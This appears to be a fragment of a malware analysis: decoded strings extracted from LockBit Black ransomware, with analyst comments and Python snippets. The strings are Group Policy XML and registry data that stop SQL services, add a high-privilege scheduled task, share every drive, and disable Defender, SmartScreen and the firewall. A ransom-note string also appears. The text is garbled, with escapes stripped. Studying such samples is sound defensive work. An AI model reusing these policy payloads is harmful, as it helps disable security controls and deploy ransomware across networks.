startupType=&#34;DISABLED&#34; serviceName=&#34;SQLWriter&#34; serviceAction=&#34;STOP&#34; timeout=&#34;30&#34;/&gt;&lt;/NTService&gt; r n t&lt;NTService clsid=&#34;{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}&#34; name=&#34;SQLTELEMETRY&#34; image=&#34;4&#34; changed=&#34;%s&#34; uid=&#34;%s&#34; disabled=&#34;0&#34;&gt;&lt;Properties startupType=&#34;DISABLED&#34; serviceName=&#34;SQLTELEMETRY&#34; serviceAction=&#34;STOP&#34; timeout=&#34;30&#34;/&gt;&lt;/NTService&gt; r n t&lt;NTService clsid=&#34;{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}&#34; name=&#34;MSSQLSERVER&#34; image=&#34;4&#34; changed=&#34;%s&#34; uid=&#34;%s&#34; disabled=&#34;0&#34;&gt;&lt;Properties startupType=&#34;DISABLED&#34; serviceName=&#34;MSSQLSERVER&#34; serviceAction=&#34;STOP&#34; timeout=&#34;60&#34;/&gt;&lt;/NTService&gt; r n&lt;/NTServices&gt; r n&#39; b&#39;&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt; r n&lt;Files clsid=&#34;{215B2E53-57CE-475c-80FE-9EEC14635851}&#34;&gt; r n t&lt;File clsid=&#34;{50BE44C8-567A-4ed1-B1D0-9234FE1F38AF}&#34; name=&#34;%s&#34; status=&#34;%s&#34; image=&#34;2&#34; bypassErrors=&#34;1&#34; changed=&#34;%s&#34; uid=&#34;%s&#34;&gt; r n t&lt;Properties action=&#34;U&#34; fromPath=&#34;%s&#34; targetPath=&#34;%s&#34; readOnly=&#34;0&#34; archive=&#34;1&#34; hidden=&#34;0&#34; suppress=&#34;0&#34;/&gt; r n t&lt;/File&gt; r n&lt;/Files&gt; r n&#39; b&#39;&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt; r n&lt;ScheduledTasks clsid=&#34;{CC63F200-7309-4ba0-B154-A71CD118DBCC}&#34;&gt; r n t&lt;TaskV2 clsid=&#34;{D8896631-B747-47a7-84A6-C155337F3BC8}&#34; name=&#34;%s&#34; image=&#34;2&#34; changed=&#34;%s&#34; uid=&#34;%s&#34;&gt;&lt;Properties action=&#34;U&#34; name=&#34;%s&#34; runAs=&#34;%s&#34; logonType=&#34;InteractiveToken&#34;&gt;&lt;Task version=&#34;1.2&#34;&gt;&lt;RegistrationInfo&gt;&lt;Author&gt;%s&lt;/Author&gt;&lt;Description&gt;&lt;/Description&gt;&lt;/RegistrationInfo&gt;&lt;Principals&gt;&lt;Principal id=&#34;Author&#34;&gt;&lt;UserId&gt;%s&lt;/UserId&gt;&lt;LogonType&gt;InteractiveToken&lt;/LogonType&gt;&lt;RunLevel&gt;HighestAvailable&lt;/RunLevel&gt;&lt;/Principal&gt;&lt;/Principals&gt;&lt;Settings&gt;&lt;IdleSettings&gt;&lt;Duration&gt;PT10M&lt;/Duration&gt;&lt;WaitTimeout&gt;PT1H&lt;/WaitTimeout&gt;&lt;StopOnIdleEnd&gt;false&lt;/StopOnIdleEnd&gt;&lt;RestartOnIdle&gt;false&lt;/RestartOnIdle&gt;&lt;/IdleSettings&gt;&lt;MultipleInstancesPolicy&gt;IgnoreNew&lt;/MultipleInstancesPolicy&gt;&lt;DisallowStartIfOnBatteries&gt;false&lt;/DisallowStartIfOnBatteries&gt;&lt;StopIfGoingOnBatteries&gt;false&lt;/StopIfGoingOnBatteries&gt;&lt;AllowHardTerminate&gt;true&lt;/AllowHardTerminate&gt;&lt;AllowStartOnDemand&gt;true&lt;/AllowStartOnDemand&gt;&lt;Enabled&gt;true&lt;/Enabled&gt;&lt;Hidden&gt;false&lt;/Hidden&gt;&lt;ExecutionTimeLimit&gt;P3D&lt;/ExecutionTimeLimit&gt;&lt;Priority&gt;7&lt;/Priority&gt;&lt;/Settings&gt;&lt;Triggers&gt;&lt;RegistrationTrigger&gt;&lt;Enabled&gt;true&lt;/Enabled&gt;&lt;/RegistrationTrigger&gt;&lt;/Triggers&gt;&lt;Actions Context=&#34;Author&#34;&gt;&lt;Exec&gt;&lt;Command&gt;%s&lt;/Command&gt;&lt;Arguments&gt;%s&lt;/Arguments&gt;&lt;/Exec&gt;&lt;/Actions&gt;&lt;/Task&gt;&lt;/Properties&gt;&lt;/TaskV2&gt; r n&lt;/ScheduledTasks&gt; r n&#39; b&#39;PReg x01[SOFTWARE Policies Microsoft Windows System;GroupPolicyRefreshTimeDC; x04; x04; x01][SOFTWARE Policies Microsoft Windows System;GroupPolicyRefreshTimeOffsetDC; x04; x04; x01][SOFTWARE Policies Microsoft Windows System;GroupPolicyRefreshTime; x04; x04; x01][SOFTWARE Policies Microsoft Windows System;GroupPolicyRefreshTimeOffset; x04; x04; x01][SOFTWARE Policies Microsoft Windows System;EnableSmartScreen; x04; x04;][SOFTWARE Policies Microsoft Windows System;**del.ShellSmartScreenLevel; x01; x04; ][SOFTWARE Policies Microsoft Windows Defender;DisableAntiSpyware; x04; x04; x01][SOFTWARE Policies Microsoft Windows Defender;DisableRoutinelyTakingAction; x04; x04; x01][SOFTWARE Policies Microsoft Windows Defender Real-Time Protection;DisableRealtimeMonitoring; x04; x04; x01][SOFTWARE Policies Microsoft Windows Defender Real-Time Protection;DisableBehaviorMonitoring; x04; x04; x01][SOFTWARE Policies Microsoft Windows Defender Spynet;SubmitSamplesConsent; x04; x04; x02][SOFTWARE Policies Microsoft Windows Defender Spynet;SpynetReporting; x04; x04;][SOFTWARE Policies Microsoft WindowsFirewall DomainProfile;EnableFirewall; x04; x04;][SOFTWARE Policies Microsoft WindowsFirewall StandardProfile;EnableFirewall; x04; x04;]&#39; WTF?? b&#39; xef xbb xbf&lt;?xml version= &#39;1.0 &#39; encoding= &#39;utf-8 &#39;?&gt; r n&lt;policyComments xmlns:xsd=&#34;http://www.w3.org/2001/XMLSchema&#34; xmlns:xsi=&#34;http://www.w3.org/2001/XMLSchema-instance&#34; revision=&#34;1.0&#34; schemaVersion=&#34;1.0&#34; xmlns=&#34;http://www.microsoft.com/GroupPolicy/CommentDefinitions&#34;&gt; r n &lt;policyNamespaces&gt; r n &lt;using prefix=&#34;ns0&#34; namespace=&#34;Microsoft.Policies.GroupPolicy&#34;&gt;&lt;/using&gt; r n &lt;using prefix=&#34;ns1&#34; namespace=&#34;Microsoft.Policies.SmartScreen&#34;&gt;&lt;/using&gt; r n &lt;using prefix=&#34;ns2&#34; namespace=&#34;Microsoft.Policies.WindowsDefender&#34;&gt;&lt;/using&gt; r n &lt;using prefix=&#34;ns3&#34; namespace=&#34;Microsoft.Policies.WindowsFirewall&#34;&gt;&lt;/using&gt; r n &lt;/policyNamespaces&gt; r n &lt;comments&gt; r n &lt;admTemplate&gt;&lt;/admTemplate&gt; r n &lt;/comments&gt; r n &lt;resources minRequiredRevision=&#34;1.0&#34;&gt; r n &lt;stringTable&gt;&lt;/stringTable&gt; r n &lt;/resources&gt; r n&lt;/policyComments&gt;&#39; b&#39;&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt; r n&lt;NetworkShareSettings clsid=&#34;{520870D8-A6E7-47e8-A8D8-E6A4E76EAEC2}&#34;&gt; r n t&lt;NetShare clsid=&#34;{2888C5E7-94FC-4739-90AA-2C1536D68BC0}&#34; image=&#34;2&#34; name=&#34;%%ComputerName%%_D&#34; changed=&#34;%s&#34; uid=&#34;%s&#34;&gt;&lt;Properties action=&#34;U&#34; name=&#34;%%ComputerName%%_D&#34; path=&#34;D:&#34; comment=&#34;&#34; allRegular=&#34;0&#34; allHidden=&#34;0&#34; allAdminDrive=&#34;0&#34; limitUsers=&#34;NO_CHANGE&#34; abe=&#34;NO_CHANGE&#34;/&gt;&lt;/NetShare&gt; r n t&lt;NetShare clsid=&#34;{2888C5E7-94FC-4739-90AA-2C1536D68BC0}&#34; image=&#34;2&#34; name=&#34;%%ComputerName%%_E&#34; changed=&#34;%s&#34; uid=&#34;%s&#34;&gt;&lt;Properties action=&#34;U&#34; name=&#34;%%ComputerName%%_E&#34; path=&#34;E:&#34; comment=&#34;&#34; allRegular=&#34;0&#34; allHidden=&#34;0&#34; allAdminDrive=&#34;0&#34; limitUsers=&#34;NO_CHANGE&#34; abe=&#34;NO_CHANGE&#34;/&gt;&lt;/NetShare&gt; r n t&lt;NetShare clsid=&#34;{2888C5E7-94FC-4739-90AA-2C1536D68BC0}&#34; image=&#34;2&#34; name=&#34;%%ComputerName%%_F&#34; changed=&#34;%s&#34; uid=&#34;%s&#34;&gt;&lt;Properties action=&#34;U&#34; name=&#34;%%ComputerName%%_F&#34; path=&#34;F:&#34; comment=&#34;&#34; allRegular=&#34;0&#34; allHidden=&#34;0&#34; allAdminDrive=&#34;0&#34; limitUsers=&#34;NO_CHANGE&#34; abe=&#34;NO_CHANGE&#34;/&gt;&lt;/NetShare&gt; r n t&lt;NetShare clsid=&#34;{2888C5E7-94FC-4739-90AA-2C1536D68BC0}&#34; image=&#34;2&#34; name=&#34;%%ComputerName%%_G&#34; changed=&#34;%s&#34; uid=&#34;%s&#34;&gt;&lt;Properties action=&#34;U&#34; name=&#34;%%ComputerName%%_G&#34; path=&#34;G:&#34; comment=&#34;&#34; allRegular=&#34;0&#34; allHidden=&#34;0&#34; allAdminDrive=&#34;0&#34; limitUsers=&#34;NO_CHANGE&#34; abe=&#34;NO_CHANGE&#34;/&gt;&lt;/NetShare&gt; r n t&lt;NetShare clsid=&#34;{2888C5E7-94FC-4739-90AA-2C1536D68BC0}&#34; image=&#34;2&#34; name=&#34;%%ComputerName%%_H&#34; changed=&#34;%s&#34; uid=&#34;%s&#34;&gt;&lt;Properties action=&#34;U&#34; name=&#34;%%ComputerName%%_H&#34; path=&#34;H:&#34; comment=&#34;&#34; allRegular=&#34;0&#34; allHidden=&#34;0&#34; allAdminDrive=&#34;0&#34; limitUsers=&#34;NO_CHANGE&#34; abe=&#34;NO_CHANGE&#34;/&gt;&lt;/NetShare&gt; r n t&lt;NetShare clsid=&#34;{2888C5E7-94FC-4739-90AA-2C1536D68BC0}&#34; image=&#34;2&#34; name=&#34;%%ComputerName%%_I&#34; changed=&#34;%s&#34; uid=&#34;%s&#34;&gt;&lt;Properties action=&#34;U&#34; name=&#34;%%ComputerName%%_I&#34; path=&#34;I:&#34; comment=&#34;&#34; allRegular=&#34;0&#34; allHidden=&#34;0&#34; allAdminDrive=&#34;0&#34; limitUsers=&#34;NO_CHANGE&#34; abe=&#34;NO_CHANGE&#34;/&gt;&lt;/NetShare&gt; r n t&lt;NetShare clsid=&#34;{2888C5E7-94FC-4739-90AA-2C1536D68BC0}&#34; image=&#34;2&#34; name=&#34;%%ComputerName%%_J&#34; changed=&#34;%s&#34; uid=&#34;%s&#34;&gt;&lt;Properties action=&#34;U&#34; name=&#34;%%ComputerName%%_J&#34; path=&#34;J:&#34; comment=&#34;&#34; allRegular=&#34;0&#34; allHidden=&#34;0&#34; allAdminDrive=&#34;0&#34; limitUsers=&#34;NO_CHANGE&#34; abe=&#34;NO_CHANGE&#34;/&gt;&lt;/NetShare&gt; r n t&lt;NetShare clsid=&#34;{2888C5E7-94FC-4739-90AA-2C1536D68BC0}&#34; image=&#34;2&#34; name=&#34;%%ComputerName%%_K&#34; changed=&#34;%s&#34; uid=&#34;%s&#34;&gt;&lt;Properties action=&#34;U&#34; name=&#34;%%ComputerName%%_K&#34; path=&#34;K:&#34; comment=&#34;&#34; allRegular=&#34;0&#34; allHidden=&#34;0&#34; allAdminDrive=&#34;0&#34; limitUsers=&#34;NO_CHANGE&#34; abe=&#34;NO_CHANGE&#34;/&gt;&lt;/NetShare&gt; r n t&lt;NetShare clsid=&#34;{2888C5E7-94FC-4739-90AA-2C1536D68BC0}&#34; image=&#34;2&#34; name=&#34;%%ComputerName%%_L&#34; changed=&#34;%s&#34; uid=&#34;%s&#34;&gt;&lt;Properties action=&#34;U&#34; name=&#34;%%ComputerName%%_L&#34; path=&#34;L:&#34; comment=&#34;&#34; allRegular=&#34;0&#34; allHidden=&#34;0&#34; allAdminDrive=&#34;0&#34; limitUsers=&#34;NO_CHANGE&#34; abe=&#34;NO_CHANGE&#34;/&gt;&lt;/NetShare&gt; r n t&lt;NetShare clsid=&#34;{2888C5E7-94FC-4739-90AA-2C1536D68BC0}&#34; image=&#34;2&#34; name=&#34;%%ComputerName%%_M&#34; changed=&#34;%s&#34; uid=&#34;%s&#34;&gt;&lt;Properties action=&#34;U&#34; name=&#34;%%ComputerName%%_M&#34; path=&#34;M:&#34; comment=&#34;&#34; allRegular=&#34;0&#34; allHidden=&#34;0&#34; allAdminDrive=&#34;0&#34; limitUsers=&#34;NO_CHANGE&#34; abe=&#34;NO_CHANGE&#34;/&gt;&lt;/NetShare&gt; r n t&lt;NetShare clsid=&#34;{2888C5E7-94FC-4739-90AA-2C1536D68BC0}&#34; image=&#34;2&#34; name=&#34;%%ComputerName%%_N&#34; changed=&#34;%s&#34; uid=&#34;%s&#34;&gt;&lt;Properties action=&#34;U&#34; name=&#34;%%ComputerName%%_N&#34; path=&#34;N:&#34; comment=&#34;&#34; allRegular=&#34;0&#34; allHidden=&#34;0&#34; allAdminDrive=&#34;0&#34; limitUsers=&#34;NO_CHANGE&#34; abe=&#34;NO_CHANGE&#34;/&gt;&lt;/NetShare&gt; r n t&lt;NetShare clsid=&#34;{2888C5E7-94FC-4739-90AA-2C1536D68BC0}&#34; image=&#34;2&#34; name=&#34;%%ComputerName%%_O&#34; changed=&#34;%s&#34; uid=&#34;%s&#34;&gt;&lt;Properties action=&#34;U&#34; name=&#34;%%ComputerName%%_O&#34; path=&#34;O:&#34; comment=&#34;&#34; allRegular=&#34;0&#34; allHidden=&#34;0&#34; allAdminDrive=&#34;0&#34; limitUsers=&#34;NO_CHANGE&#34; abe=&#34;NO_CHANGE&#34;/&gt;&lt;/NetShare&gt; r n t&lt;NetShare clsid=&#34;{2888C5E7-94FC-4739-90AA-2C1536D68BC0}&#34; image=&#34;2&#34; name=&#34;%%ComputerName%%_P&#34; changed=&#34;%s&#34; uid=&#34;%s&#34;&gt;&lt;Properties action=&#34;U&#34; name=&#34;%%ComputerName%%_P&#34; path=&#34;P:&#34; comment=&#34;&#34; allRegular=&#34;0&#34; allHidden=&#34;0&#34; allAdminDrive=&#34;0&#34; limitUsers=&#34;NO_CHANGE&#34; abe=&#34;NO_CHANGE&#34;/&gt;&lt;/NetShare&gt; r n t&lt;NetShare clsid=&#34;{2888C5E7-94FC-4739-90AA-2C1536D68BC0}&#34; image=&#34;2&#34; name=&#34;%%ComputerName%%_Q&#34; changed=&#34;%s&#34; uid=&#34;%s&#34;&gt;&lt;Properties action=&#34;U&#34; name=&#34;%%ComputerName%%_Q&#34; path=&#34;Q:&#34; comment=&#34;&#34; allRegular=&#34;0&#34; allHidden=&#34;0&#34; allAdminDrive=&#34;0&#34; limitUsers=&#34;NO_CHANGE&#34; abe=&#34;NO_CHANGE&#34;/&gt;&lt;/NetShare&gt; r n t&lt;NetShare clsid=&#34;{2888C5E7-94FC-4739-90AA-2C1536D68BC0}&#34; image=&#34;2&#34; name=&#34;%%ComputerName%%_R&#34; changed=&#34;%s&#34; uid=&#34;%s&#34;&gt;&lt;Properties action=&#34;U&#34; name=&#34;%%ComputerName%%_R&#34; path=&#34;R:&#34; comment=&#34;&#34; allRegular=&#34;0&#34; allHidden=&#34;0&#34; allAdminDrive=&#34;0&#34; limitUsers=&#34;NO_CHANGE&#34; abe=&#34;NO_CHANGE&#34;/&gt;&lt;/NetShare&gt; r n t&lt;NetShare clsid=&#34;{2888C5E7-94FC-4739-90AA-2C1536D68BC0}&#34; image=&#34;2&#34; name=&#34;%%ComputerName%%_S&#34; changed=&#34;%s&#34; uid=&#34;%s&#34;&gt;&lt;Properties action=&#34;U&#34; name=&#34;%%ComputerName%%_S&#34; path=&#34;S:&#34; comment=&#34;&#34; allRegular=&#34;0&#34; allHidden=&#34;0&#34; allAdminDrive=&#34;0&#34; limitUsers=&#34;NO_CHANGE&#34; abe=&#34;NO_CHANGE&#34;/&gt;&lt;/NetShare&gt; r n t&lt;NetShare clsid=&#34;{2888C5E7-94FC-4739-90AA-2C1536D68BC0}&#34; image=&#34;2&#34; name=&#34;%%ComputerName%%_T&#34; changed=&#34;%s&#34; uid=&#34;%s&#34;&gt;&lt;Properties action=&#34;U&#34; name=&#34;%%ComputerName%%_T&#34; path=&#34;T:&#34; comment=&#34;&#34; allRegular=&#34;0&#34; allHidden=&#34;0&#34; allAdminDrive=&#34;0&#34; limitUsers=&#34;NO_CHANGE&#34; abe=&#34;NO_CHANGE&#34;/&gt;&lt;/NetShare&gt; r n t&lt;NetShare clsid=&#34;{2888C5E7-94FC-4739-90AA-2C1536D68BC0}&#34; image=&#34;2&#34; name=&#34;%%ComputerName%%_U&#34; changed=&#34;%s&#34; uid=&#34;%s&#34;&gt;&lt;Properties action=&#34;U&#34; name=&#34;%%ComputerName%%_U&#34; path=&#34;U:&#34; comment=&#34;&#34; allRegular=&#34;0&#34; allHidden=&#34;0&#34; allAdminDrive=&#34;0&#34; limitUsers=&#34;NO_CHANGE&#34; abe=&#34;NO_CHANGE&#34;/&gt;&lt;/NetShare&gt; r n t&lt;NetShare clsid=&#34;{2888C5E7-94FC-4739-90AA-2C1536D68BC0}&#34; image=&#34;2&#34; name=&#34;%%ComputerName%%_V&#34; changed=&#34;%s&#34; uid=&#34;%s&#34;&gt;&lt;Properties action=&#34;U&#34; name=&#34;%%ComputerName%%_V&#34; path=&#34;V:&#34; comment=&#34;&#34; allRegular=&#34;0&#34; allHidden=&#34;0&#34; allAdminDrive=&#34;0&#34; limitUsers=&#34;NO_CHANGE&#34; abe=&#34;NO_CHANGE&#34;/&gt;&lt;/NetShare&gt; r n t&lt;NetShare clsid=&#34;{2888C5E7-94FC-4739-90AA-2C1536D68BC0}&#34; image=&#34;2&#34; name=&#34;%%ComputerName%%_W&#34; changed=&#34;%s&#34; uid=&#34;%s&#34;&gt;&lt;Properties action=&#34;U&#34; name=&#34;%%ComputerName%%_W&#34; path=&#34;W:&#34; comment=&#34;&#34; allRegular=&#34;0&#34; allHidden=&#34;0&#34; allAdminDrive=&#34;0&#34; limitUsers=&#34;NO_CHANGE&#34; abe=&#34;NO_CHANGE&#34;/&gt;&lt;/NetShare&gt; r n t&lt;NetShare clsid=&#34;{2888C5E7-94FC-4739-90AA-2C1536D68BC0}&#34; image=&#34;2&#34; name=&#34;%%ComputerName%%_X&#34; changed=&#34;%s&#34; uid=&#34;%s&#34;&gt;&lt;Properties action=&#34;U&#34; name=&#34;%%ComputerName%%_X&#34; path=&#34;X:&#34; comment=&#34;&#34; allRegular=&#34;0&#34; allHidden=&#34;0&#34; allAdminDrive=&#34;0&#34; limitUsers=&#34;NO_CHANGE&#34; abe=&#34;NO_CHANGE&#34;/&gt;&lt;/NetShare&gt; r n t&lt;NetShare clsid=&#34;{2888C5E7-94FC-4739-90AA-2C1536D68BC0}&#34; image=&#34;2&#34; name=&#34;%%ComputerName%%_Y&#34; changed=&#34;%s&#34; uid=&#34;%s&#34;&gt;&lt;Properties action=&#34;U&#34; name=&#34;%%ComputerName%%_Y&#34; path=&#34;Y:&#34; comment=&#34;&#34; allRegular=&#34;0&#34; allHidden=&#34;0&#34; allAdminDrive=&#34;0&#34; limitUsers=&#34;NO_CHANGE&#34; abe=&#34;NO_CHANGE&#34;/&gt;&lt;/NetShare&gt; r n t&lt;NetShare clsid=&#34;{2888C5E7-94FC-4739-90AA-2C1536D68BC0}&#34; image=&#34;2&#34; name=&#34;%%ComputerName%%_Z&#34; changed=&#34;%s&#34; uid=&#34;%s&#34;&gt;&lt;Properties action=&#34;U&#34; name=&#34;%%ComputerName%%_Z&#34; path=&#34;Z:&#34; comment=&#34;&#34; allRegular=&#34;0&#34; allHidden=&#34;0&#34; allAdminDrive=&#34;0&#34; limitUsers=&#34;NO_CHANGE&#34; abe=&#34;NO_CHANGE&#34;/&gt;&lt;/NetShare&gt; r n&lt;/NetworkShareSettings&gt; r n&#39; b&#39;[{00000000-0000-0000-0000-000000000000}{3BAE7E51-E3F4-41D0-853D-9BB9FD47605F}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}][{7150F9BF-48AD-4DA4-A49C-29EF4A8369BA}{3BAE7E51-E3F4-41D0-853D-9BB9FD47605F}][{AADCED64-746C-4633-A97C-D61349046527}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]&#39; b&#39;[{00000000-0000-0000-0000-000000000000}{BFCBBEB0-9DF4-4C0C-A728-434EA66A0373}{CC5746A9-9B74-4BE5-AE2E-64379C86E0E4}][{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{D02B1F72-3407-48AE-BA88-E8213C6761F1}][{6A4C88C6-C502-4F74-8F60-2CB23EDC24E2}{BFCBBEB0-9DF4-4C0C-A728-434EA66A0373}][{91FBB303-0CD5-4055-BF42-E512A681B325}{CC5746A9-9B74-4BE5-AE2E-64379C86E0E4}]&#39; ** PE file . len(b&#39;LockBit Black r n r nAll your important files are stolen and encrypted! r nYou must find %s file r nand follow the instructi&#39;) . 116 . data = &#39;1&#39; 8 - len(data) % 8 . 7 . open(&#39;/tmp/something.bin&#39;,&#39;wb&#39;).write(b&#39; x00 x00 x01 x00 x03 x0000 x00 x00 x01 x00 x00 xa8% x00 x006 x00 x00 x00 x00 x00 x01 x00 x00 xa8 x10 x00 x00 xde% x00 x00 x10 x10 x00 x00 x01 x00 x00h x04 x00 x00 x866 x00 x00( x00 x00 x000 x00 x00 x00` x00 x00 x00 x01 x00 x00 x00 x00 x00 x00 x80% x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 xaa xaa xaa x00 x00 x00 x00 x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 xff xff xff x03 x00 x00 x00 x03 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x01 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 xc3 xc3 xc3 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 xff xff xff x01 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 xff xff xff x03 xff xff xff x04 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 xd0 xd0 xd0 x00 xff xff xffP xff xff xff x85 xff xff xff x86 xff xff xff x87 xff xff xff x87 xff xff xff x87 xff xff xff x87 xff xff xff x87 